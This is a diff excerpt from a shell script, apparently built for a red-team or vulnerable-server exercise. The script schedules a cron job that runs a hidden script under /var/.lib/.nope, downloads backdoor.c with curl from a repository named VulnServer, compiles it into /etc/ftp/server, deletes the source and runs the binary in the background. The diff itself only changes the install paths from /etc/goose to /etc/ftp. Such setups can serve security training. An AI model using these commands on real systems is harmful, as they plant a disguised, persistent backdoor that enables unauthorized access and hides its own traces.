@@ -68,16 +68,15 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
-mkdir /etc/goose
 mkdir /etc/ftp
-sudo curl -s -o /etc/goose/server.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
+sudo curl -s -o /etc/ftp/server.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
 
 # Ensure gcc installed
 DEBIAN_FRONTEND=noninteractive apt-get install build-essential -y
 
 # Compile and remove source code
-gcc -o /etc/ftp/server /etc/goose/server.c
-rm /etc/goose/server.c
+gcc -o /etc/ftp/server /etc/ftp/server.c
+rm /etc/ftp/server.c
 
 # Run the binary in background
 nohup /etc/ftp/server </dev/null >/dev/null 2>&1 &
